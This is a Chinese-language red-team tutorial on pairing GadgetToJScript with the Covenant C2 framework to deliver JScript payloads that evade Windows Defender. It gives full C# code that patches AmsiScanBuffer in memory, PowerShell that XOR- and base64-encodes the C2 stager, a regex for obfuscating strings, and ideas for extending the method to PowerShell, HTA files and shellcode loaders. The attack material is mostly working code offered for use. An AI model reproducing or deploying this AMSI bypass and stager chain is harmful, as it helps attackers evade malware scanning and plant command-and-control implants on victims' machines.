一
前言

GadgetToJscript（https://github.com/med0x2e/GadgetToJScript）用于生成.NET序列化的工具，当使用基于JS/VBS/VBA脚本中的BinaryFormatter反序列化时，该工具可以触发.NET程序集加载/执行。同时相比James Forshaw的DotNetToJScript添加了绕过.Net 4.8+阻止Assembly.Load的功能。

Covenant（https://github.com/cobbr/Covenant）是一个.NET开发的C2(command and control)框架，旨在突出.NET的攻击面，并充当红队成员的协作命令和控制平台。使用.NET Core的开发环境，不仅支持Linux，MacOS和Windows，还支持docker容器。最特别的地方是支持动态编译，能够将输入的C#代码上传至C2 Server，获得编译后的文件并使用Assembly.Load()从内存进行加载。

本文将结合https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html这篇文章提供的思路分享Covenant绕过AMSI的方法。

二
修复GadgetToJscript中的bug

根据文中step2的步骤，将payload.txt这个文件复制到GadgettoJscript当前目录下，但是实际上GadgetToJscript默认没有读取payload.txt中的代码，可能是作者后来忘记修改了。

所以我们需要把GadhetToJscript的代码改一下。首先把git clone下载的GadhetToJscript项目用VS打开，定位到TestAssemblelyLoader.cs文件。

为了方便测试，我们修改上图中public static Assembly compile()函数里面的参数，添加参数string inFile，这样就不用每次测试的时候都去修改源码，把文件的文件名作为参数传递到compile函数里，不用每次测试都修改要读取的文件的文件名。因为GadgetToJscript的编译过程属于动态编译，所以里面涉及到很多DLL的引用。

如上图代码里默认增加了System.dll，但是我们编译的代码越复杂增加的dll引用就会越多，所以为了方便，我们需要给public static Assembly compile()函数里的参数再添加一个参数string dllstring，用来添加引入多个需要用到的DLL的名字。删除_testClass这个变量和内容，然后添加读取dll引用的代码如下：

if (!string.IsNullOrEmpty(dllstring)){foreach (var refdll in dllstring.Split(',')){parameters.ReferencedAssemblies.Add(refdll);         }}

把要引用的DLL文件名（如果有多个就用逗号分开）作为字符串输入存在dllstring里 ，如果读取进来的dllstring字符串变量不为空，那么就把字符串用逗号分开以后的DLL文件逐个添加进程序的引用里。

这里需要修改编译的函数CompilerResults results = provider.CompileAssemblyFromSource(parameters, _testClass);因为增加了文件的引入和DLL的引入，所以编译的函数也需要修改下，这里我们把它修改成CompilerResults results = provider.CompileAssemblyFromFile(parameters,inFile);。


同时还需要修改GadgetToJscript的主程序，打开 Program.cs。

添加两个静态变量用以存储传进来的文件名和需要引用的DLL的名字。

private static string _inputFName = "payload.txt";private static string _inputDllString = null;

然后添加读取输入的文件和DLL的代码。

{"f|inputfile=","Input source file name",v => _inputFName = v},   {"d|inputdll=","A comma-separated string contains dll names for compiling csharp project",v => _inputDllString = v },

最后修改Program.cs原文件的133行，对应TestAssemblelyLoader.cs中的compile()函数，因为之前我们修改了他的参数所以这里我们也要对应修改。

修改前：Assembly testAssembly = TestAssemblyLoader.compile();

修改后：Assembly testAssembly = TestAssemblyLoader.compile(_inputFName,_inputDllString);

代码修改完以后就可以编译测试了。


三
GadgetToJscript测试Covenant的payload

首先需要部署Covenant，用docker部署好Covenant以后添加listener，然后在lanchers列表选择binary，进入binary界面后点击Generate生成代码。

点击Code，将StagerCode中的代码复制下来。

把刚才复制的代码保存在文件里，为了方便测试我们就放在GadgetToJScript项目的编译路径里\GadgetToJScript\GadgetToJScript\bin\Release，保存名字为grunt.cs，然后在命令行里依次运行以下命令编译运行测试。

csc /t:exe grunt.csgrunt.exe

测试成功后会获得Grunts（相当Cobaltstrike的session）。

由于grunt.cs代码中有两个命名空间不被包含在System.dll里：

1、System.Linq;

2、System.IO.Pipes;

它们在System.Core.dll里，所以调用的时候我们需要手动添加System.Core.dll，在命令行输入：

GadgetToJScript.exe -w js -d System.Core.dll -f grunt.cs -o grunt

其中：

-w 是输出文件的格式

-d 是需要添加的dll，如果有多个可以用逗号隔开

-f 是我们引入的csharp文件，这里我们选择刚才的 grunt.cs 测试

-o 是输出的文件名

然后我们会得到名为grunt.js的文件，打开grunt.js文件。

运行cscript grunt.js测试js文件的过程中会发现windows defender什么提示都没有，也没有在Covenant获得Grunt。如果是Windows defender杀了的话一定会有拦截提示，但是这个没有弹提示，所以很明显就是AMSI在作祟。

如何验证是否是amsi的问题，我们只需要复制cscript.exe到当前目录命名为amsi.dll，然后运行amsi.dll grunt.js，你会发现Windows defender弹出了报毒提示，同时Covenant也获得了Grunt，通过这步就可以判断这个其实就是amsi的问题了。那么如何解决这个问题呢，继续往下看。

四
修复GadgetToJscript中的bug

AMSI，即ANTI MALWARE SCAN INTERFACE（反恶意软件扫描接口）。顾名思义其作用就是扫描、检测并阻止任何有害的程序。对于amsi基于字符串的检测我们可以对字符串进行编码，或者将其拆分后再重新组合，就可以实现绕过。

Amsi会扫描两个部分，一个是在我们用GadgetToJScript生成的js代码上，另一个是在.net的程序集中。但是目前在哪里我们不知道，所以先混淆下js文件，js一般情况下杀软杀的不是变量名就是字符串。我们可以用正则表达式对js文件的字符串进行替换以达到没有字符串的效果。

Find: \(["'](.*?)["']\)Replace: \(/$1/.source\)

替换结果如图所示。

但是如果代码量大的话，显然这不是最好的方法，所以我们应该采取另一种方法：通过内存修补绕过AMSI。但是https://rastamouse.me/2018/10/amsiscanbuffer-bypass/这篇文章中的方法比较过时了，主要思路是通过找到内存中AmsiScanBuffer函数的位置，然后通过patch，让AmsiScanBuffer这个函数不再继续运行，直接在函数的开始让它返回一个0，后来微软进行了一次更新，对.net程序集AmsiScanBuffer的扫描结果必须返回一个有效值:

0xb8, 0x57, 0x00, 0x07, 0x80，同时要加上0xC3（0xC3是return）。所以相比起参考链接里面bypass amsi的代码最终PatchASB.cs代码如下：

using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Reflection;using System.Runtime.InteropServices; namespace AMSI{  public class Program    {         [DllImport("kernel32")]        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);        [DllImport("kernel32")]        private static extern IntPtr LoadLibrary(string name);        [DllImport("kernel32")]        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);                    static void Main(string[] args)        {            new Program();        }         public Program()        {            Patch();        }         public static void Patch()        {            // Console.WriteLine("-- AMSI Patching");            //Console.WriteLine("-- Paul (@am0nsec)\n");             // Get the DllCanUnload function address            IntPtr hModule = LoadLibrary("amsi.dll");            //Console.WriteLine("[+] AMSI DLL handle: " + hModule);             IntPtr dllCanUnloadNowAddress = GetProcAddress(hModule, "DllCanUnloadNow");//AmsiScanBuffer            //Console.WriteLine("[+] DllCanUnloadNow address: " + dllCanUnloadNowAddress);             // Dynamically get the address of the function to patch            byte[] egg = { };            if (IntPtr.Size == 8)            {                egg = new byte[] {                    0x4C, 0x8B, 0xDC,       // mov     r11,rsp                    0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx                    0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp                    0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi                    0x57,                   // push    rdi                    0x41, 0x56,             // push    r14                    0x41, 0x57,             // push    r15                    0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h                };            }            else            {                egg = new byte[] {                    0x8B, 0xFF,             // mov     edi,edi                    0x55,                   // push    ebp                    0x8B, 0xEC,             // mov     ebp,esp                    0x83, 0xEC, 0x18,       // sub     esp,18h                    0x53,                   // push    ebx                    0x56                    // push    esi                };            }            IntPtr address = FindAddress(dllCanUnloadNowAddress, egg);            // Console.WriteLine("[+] Targeted address: " + address);             // Change the memory protection of the memory region             // PAGE_READWRITE = 0x04            uint oldProtectionBuffer = 0;            VirtualProtect(address, (UIntPtr)2, 4, out oldProtectionBuffer);             // Patch the function            byte[] patch = { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xC3 };            Marshal.Copy(patch, 0, address, 6);             // Reinitialise the memory protection of the memory region            uint a = 0;            VirtualProtect(address, (UIntPtr)2, oldProtectionBuffer, out a);        }         private static IntPtr FindAddress(IntPtr address, byte[] egg)        {            while (true)            {                int count = 0;                 while (true)                {                    address = IntPtr.Add(address, 1);                    if (Marshal.ReadByte(address) == (byte)egg.GetValue(count))                    {                        count++;                        if (count == egg.Length)                            return IntPtr.Subtract(address, egg.Length - 1);                    }                    else                    {                        break;                    }                }            }        }    }}

其中两处值得注意的地方是因为第一处代码中不能直接出现AmsiScanBuffer的字符串，否则会被amsi识别，所以替换成DllCanUnloadNow。用egg hunt的方式，以DllCanUnloadNow的函数地址为基址寻找AmsiScanBuffer函数的地址，再patch。

第二处因为微软的更新，使得对.net Assembly.load的程序集扫描结果必须返回一个有效值，所以替换为0xb8,0x57,0x00,0x07,0x80后再加上return 0xC3，接着使用VS打开以上代码，为了方便验证，我们可以添加一个用来暂停的massagebox代码。

在VS编译代码以后，命名为PatchASB.exe，然开PatchASB.exe，用Windbg Attach该进程进行验证，可以看到patch成功。

五
把bypass AMSI的方法和Covenant结合起来

我们可以把Covenant payload的二进制文件作为字节读取进来，然后用Assembly.load的方式进行加载，但是在Patch之前，在内存中我们都不能让.Net程序集直接显露出原形，否则会被Amsi拦截，所以我们就需要对读取进来的字节进行加密或者混淆处理，这里我们使用一种比较简单的方法Xor + base64足以应付大部分杀软。

先用powershell代码读取二进制文件，这里我们用上面的grunt.exe作为例子，先对每个字节进行Xor处理，这里我们随便异或了0x77也可以是其他值，再base64 encode处理，最后将命令的输出直接发送到剪贴板。

[byte[]]$rawbytes = [System.IO.File]::ReadAllBytes("C:\Projects\Project_RedCore\GadgetToJScript\GadgetToJScript\bin\Release\grunt.exe")for ($i = 0; $i -lt $rawbytes.Length; $i++){    $rawbytes[$i] = $rawbytes[$i] -bxor 0x77}[System.Convert]::ToBase64String($rawbytes) | clip

接着把剪贴板的内容复制到PatchASB.cs中存放在一个静态变量里，先对静态变量做base64的decode处理，然后异或0x77再以Assembly.load的方式加载。


值得注意的是gadgetToJscript通过实例化类来加载程序集的所以，所以我们必须在PatchASB.cs中添加一个构造函数，然后把核心代码都放在构造函数里。

最终PatchASB.cs参考代码如下：

编译测试成功后命令行运行：

GadgetToJScript.exe -w js -d System.Core.dll -f PatchASB.cs -o PatchASB

就能得到一个PatchASB.js文件。然后运行cscript.exe PatchASB.js，这里要注意的是如果你用32位的cpu编译PatchASB的话，得到的JS文件也需要32位cscript.exe运行，C:\Windows\SysWOW64\cscript.exe PathASB.js。运行以后正常情况下我们就能看到Covenant提示获得新的Grunt了。

六
思路拓展

这里的方法和思路还是很不错的，我们可以根据这个做些拓展，例如可以把VS编译PatchASB.exe（里面只包含bypass amsi的代码）和powershell代码结合在一起就可以直接运行某些恶意的powershell代码。

结合其他powershell代码再base64处理一下，然后Powershell -enc xxxxxxxxxx。

GadgetToJscript还可以生成其他格式，所以我们可以和其他工具结合使用，例如可以把bypass amsi的代码作为hta的一部分，然后获得session的代码时hta文件的另一部分。

还可以自己写一个shellcode loader，通过Assembly.load的方法结合PatchASB.exe，再通过GadgetToJscript得到的js文件免杀的效果也很好，前提是你的shellcode本身要免杀。值得注意的是你的shellcode，编译的cpu，PatchASB.exe, cscript.exe的位数（32/64）都要对应。
